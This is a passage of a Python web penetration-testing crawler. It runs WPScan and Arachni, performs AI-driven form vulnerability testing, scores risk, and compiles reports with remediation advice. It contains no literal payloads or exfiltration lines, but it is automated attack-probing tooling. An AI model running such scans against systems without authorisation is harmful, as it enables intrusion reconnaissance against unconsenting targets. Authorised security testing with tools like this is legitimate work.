                await self._integrate_wpscan()
            
            # Always run Arachni scan
            capture_print("🕷️ Running Arachni scan...")
            await self._integrate_arachni()
            
            comprehensive_report["phases"][-1]["end_time"] = datetime.now().isoformat()
            comprehensive_report["phases"][-1]["findings"] = dict(self.discovered_assets)
            
            # Phase 5: AI Analysis
            capture_print("\n🤖 Phase 5: AI-Powered Analysis")
            comprehensive_report["phases"].append({"name": "AI Analysis", "start_time": datetime.now().isoformat()})
            await self.ai_powered_analysis_summary()
            comprehensive_report["phases"][-1]["end_time"] = datetime.now().isoformat()
            
            # Final report compilation
            capture_print("\n✅ Advanced intelligent security testing completed!")
            
            # Compile final report
            comprehensive_report.update({
                "scan_end_time": datetime.now().isoformat(),
                "discovered_assets": dict(self.discovered_assets),
                "vulnerabilities": dict(self.discovered_assets.get('vulnerabilities', {})),
                "summary": self._generate_summary_data(),
                "recommendations": self._generate_recommendations()
            })
            
            # Print final summary
            self._print_final_summary()
            
            capture_print("🔍 Browser remains open for manual inspection")
            
            # Convert sets to lists for JSON serialization
            comprehensive_report = self._make_json_serializable(comprehensive_report)
            
            # Return comprehensive report
            return comprehensive_report
            
        except KeyboardInterrupt:
            capture_print("\n⚠️ Testing interrupted by user")
            comprehensive_report["status"] = "interrupted"
            return comprehensive_report
        except Exception as e:
            capture_print(f"❌ Critical error: {e}")
            comprehensive_report["error"] = str(e)
            comprehensive_report["status"] = "failed"
            return comprehensive_report
        finally:
            if hasattr(self, 'driver') and self.driver:
                try:
                    self.driver.quit()
                except:
                    pass
            if hasattr(self, 'session') and self.session:
                try:
                    self.session.close()
                except:
                    pass

    def _make_json_serializable(self, obj):
        """Convert non-JSON serializable objects (like sets) to serializable ones."""
        if isinstance(obj, dict):
            return {key: self._make_json_serializable(value) for key, value in obj.items()}
        elif isinstance(obj, list):
            return [self._make_json_serializable(item) for item in obj]
        elif isinstance(obj, set):
            return list(obj)
        else:
            # Handle other non-serializable types if needed
            try:
                json.dumps(obj)
                return obj
            except (TypeError, ValueError):
                return str(obj)

    def _generate_summary_data(self):
        """Generate comprehensive summary data for the report"""
        vulns = self.discovered_assets.get('vulnerabilities', {})
        
        # Calculate risk scores
        critical_count = sum(1 for v in vulns.values() if v.get('severity') == 'critical')
        high_count = sum(1 for v in vulns.values() if v.get('severity') == 'high')
        medium_count = sum(1 for v in vulns.values() if v.get('severity') == 'medium')
        low_count = sum(1 for v in vulns.values() if v.get('severity') in ['low', 'info'])
        
        risk_score = min(10, 1 + critical_count * 3 + high_count * 2 + medium_count * 1 + low_count * 0.5)
        
        return {
            "target_url": self.target_url,
            "pages_analyzed": len(self.discovered_assets.get('pages', {})),
            "links_discovered": sum(len(links) for links in self.discovered_assets.get('links', {}).values()),
            "forms_tested": len(self.discovered_assets.get('forms', {})),
            "technologies_detected": list(self.discovered_assets.get('technologies', set())),
            "vulnerabilities_found": len(vulns),
            "vulnerability_breakdown": {
                "critical": critical_count,
                "high": high_count,
                "medium": medium_count,
                "low": low_count
            },
            "risk_score": round(risk_score, 1),
            "risk_level": self._get_risk_level(risk_score)
        }
    
    def _get_risk_level(self, score):
        """Convert risk score to risk level"""
        if score <= 3:
            return "LOW RISK"
        elif score <= 6:
            return "MEDIUM RISK"
        elif score <= 8:
            return "HIGH RISK"
        else:
            return "CRITICAL RISK"
    
    def _generate_recommendations(self):
        """Generate security recommendations based on findings"""
        recommendations = []
        vulns = self.discovered_assets.get('vulnerabilities', {})
        
        # WordPress-specific recommendations
        if 'xmlrpc_enabled' in vulns:
            recommendations.append("🔧 Disable XML-RPC interface if not needed to prevent brute-force and DDoS attacks.")
        
        if 'user_enumeration' in vulns:
            recommendations.append("🛡️ Implement user enumeration protection (e.g., disable REST API user endpoints, use plugins).")
        
        if 'directory_listing' in vulns:
            recommendations.append("📁 Disable directory listings on your web server to prevent information leakage.")

        # General vulnerability recommendations
        vuln_types = set(vuln.get('type', 'general') for vuln in vulns.values())
        if 'xss' in vuln_types:
            recommendations.append("🚫 Implement a strict Content Security Policy (CSP) and use context-aware output encoding to prevent XSS.")
        if 'sqli' in vuln_types:
            recommendations.append("💾 Use parameterized queries (prepared statements) for all database interactions to prevent SQL Injection.")
        if 'command_injection' in vuln_types:
            recommendations.append("⚡ Sanitize and validate all user-supplied input that is passed to system shells or interpreters.")
        
        # Base recommendations
        base_recommendations = [
            "🔄 Keep all software (CMS, frameworks, libraries) up to date.",
            "🔐 Implement strong password policies and enable multi-factor authentication.",
            "🔒 Use SSL/TLS (HTTPS) for all data transmission.",
            "📋 Perform regular, automated security backups and test the restoration process.",
            "🚨 Install and properly configure a Web Application Firewall (WAF).",
            "🧪 Commission regular, in-depth penetration testing from third-party experts.",
            "📡 Implement security headers like HSTS, X-Frame-Options, and X-Content-Type-Options.",
            "🔐 Harden file permissions on the web server.",
            "📊 Aggregate security logs and monitor them for suspicious activity."
        ]
        
        # Combine and deduplicate
        all_recommendations = recommendations + base_recommendations
        return list(dict.fromkeys(all_recommendations))

    async def _integrate_wpscan(self):
        """Integrate WPScan for WordPress targets"""
        self.log_live_event("WPScan", "Starting WPScan for WordPress target", "In Progress")
        try:
            # Run WPScan CLI
            cmd = ["wpscan", "--url", self.target_url, "--no-update"]
            output = await asyncio.to_thread(subprocess.check_output, cmd, stderr=subprocess.STDOUT, text=True)
            self.log_live_event("WPScan", "WPScan completed successfully", "Success")
            # Store raw WPScan output
            self.discovered_assets['wpscan'] = output
        except Exception as e:
            self.log_live_event("WPScan", f"WPScan failed: {e}", "Error")

    async def _integrate_arachni(self):
        """Integrate Arachni scanner for general vulnerability scanning"""
        self.log_live_event("Arachni", "Starting Arachni scan", "In Progress")
        try:
            report_file = Path("arachni_report.afr")
            cmd = ["arachni", self.target_url, "--report-save-path", str(report_file)]
            output = await asyncio.to_thread(subprocess.check_output, cmd, stderr=subprocess.STDOUT, text=True)
            self.log_live_event("Arachni", "Arachni scan completed successfully", "Success")
            # Note report location
            self.discovered_assets['arachni_report'] = str(report_file)
        except Exception as e:
            self.log_live_event("Arachni", f"Arachni scan failed: {e}", "Error")

    def _print_final_summary(self):
        """Print comprehensive test summary"""
        print("\n" + "="*70)
        print("🚀 ADVANCED INTELLIGENT PENETRATION TEST SUMMARY")
        print("="*70)
        
        print(f"🎯 Target: {self.target_url}")
        print(f"📊 Pages Analyzed: {len(self.discovered_assets['pages'])}")
        print(f"🔗 Links Discovered: {sum(len(links) for links in self.discovered_assets.get('links', {}).values())}")
        print(f"📝 Forms Tested: {len(self.discovered_assets['forms'])}")
        print(f"🔧 Technologies: {', '.join(self.discovered_assets['technologies']) or 'None detected'}")
        
        vulns = self.discovered_assets['vulnerabilities']
        if vulns:
            print(f"\n🚨 VULNERABILITIES FOUND: {len(vulns)}")
            for vuln_type, details in vulns.items():
                print(f"  • {vuln_type.upper()}: {details.get('payload', 'Unknown')}")
        else:
            print("\n✅ No critical vulnerabilities detected in automated testing")
        
        print("\n💡 RECOMMENDATIONS:")
        print("  • Review all forms for input validation")
        print("  • Implement proper output encoding")
        print("  • Use parameterized queries for database operations")
        print("  • Enable security headers (CSP, HSTS, etc.)")
        print("  • Regular security testing and code reviews")
        
        print("="*70)

    async def _stagehand_enhanced_discovery(self, target_url):
        """Use Stagehand AI for enhanced intelligent discovery and form testing"""
        if not self.stagehand_crawler:
            return
        
        try:
            print("  🤖 Using Stagehand AI for intelligent page navigation...")
            
            # Navigate using AI
            nav_result = await self.stagehand_crawler.navigate_to(target_url)
            if nav_result.success:
                print(f"  ✅ Stagehand navigation successful: {nav_result.title}")
                print(f"  📊 AI discovered: {nav_result.forms_found} forms, {nav_result.links_found} links")
                
                # Store navigation data
                self.discovered_assets['stagehand_navigation'] = {
                    'title': nav_result.title,
                    'forms_found': nav_result.forms_found,
                    'links_found': nav_result.links_found,
                    'screenshots': nav_result.screenshots
                }
            
            # AI-powered form discovery
            print("  🔍 AI-powered form discovery and analysis...")
            forms = await self.stagehand_crawler.intelligent_form_discovery()
            
            for form in forms:
                form_id = form.get('id', 'unknown')
                print(f"  📝 Testing form: {form_id}")
                
                # Test form with AI-generated or rule-based payloads
                test_result = await self.stagehand_crawler.intelligent_form_testing(form)
                
                if test_result.success:
                    print(f"    ✅ Form testing completed: {len(test_result.fields_filled)} fields tested")
                    
                    # Check for vulnerabilities
                    if test_result.vulnerability_indicators:
                        for vuln in test_result.vulnerability_indicators:
                            vuln_type = vuln.get('type', 'unknown')
                            confidence = vuln.get('confidence', 0.0)
                            payload = vuln.get('payload', '')
                            
                            print(f"    🚨 Vulnerability detected: {vuln_type.upper()} (confidence: {confidence:.2f})")
                            
                            # Store vulnerability
                            self.discovered_assets['vulnerabilities'][f"stagehand_{vuln_type}_{form_id}"] = {
                                'type': vuln_type,
                                'confidence': confidence,
                                'payload': payload,
                                'evidence': vuln.get('evidence', []),
                                'form_id': form_id,
                                'method': 'stagehand_ai'
                            }
                    
                    # Store form interaction data
                    self.discovered_assets['stagehand_forms'] = self.discovered_assets.get('stagehand_forms', {})
                    self.discovered_assets['stagehand_forms'][form_id] = {
                        'fields_tested': len(test_result.fields_filled),
                        'vulnerabilities': len(test_result.vulnerability_indicators),
                        'screenshots': test_result.screenshots
                    }
            
            # AI-powered link discovery
            print("  🔗 AI-powered link discovery...")
            links = await self.stagehand_crawler.intelligent_link_discovery()
            
            ai_discovered_links = []
            for link in links[:10]:  # Limit to top 10 AI-discovered links
                link_info = {
                    'id': link.get('id', 'unknown'),
                    'href': link.get('href', ''),
                    'text': link.get('text', ''),
                    'analysis': link.get('analysis', {}),
                    'method': 'stagehand_ai'
                }
                ai_discovered_links.append(link_info)
            
            if ai_discovered_links:
                self.discovered_assets['stagehand_links'] = ai_discovered_links
                print(f"  ✅ AI discovered {len(ai_discovered_links)} high-priority links")
            
            # Get Stagehand summary
            summary = self.stagehand_crawler.get_navigation_summary()
            print(f"  📊 Stagehand Summary: {summary['total_navigations']} navigations, "
                  f"{summary['vulnerabilities_found']} vulnerabilities found")
            
            self.discovered_assets['stagehand_summary'] = summary
            
        except Exception as e:
            print(f"  ❌ Stagehand enhanced discovery failed: {e}")

async def main():
    if len(sys.argv) != 2:
        print("Usage: python advanced_intelligent_crawler.py <target_url>")
        print("Example: python advanced_intelligent_crawler.py http://testphp.vulnweb.com/")
        return
    
    target_url = sys.argv[1]
    crawler = AdvancedIntelligentCrawler()
    await crawler.comprehensive_crawl_and_test(target_url)

if __name__ == "__main__":
    asyncio.run(main())
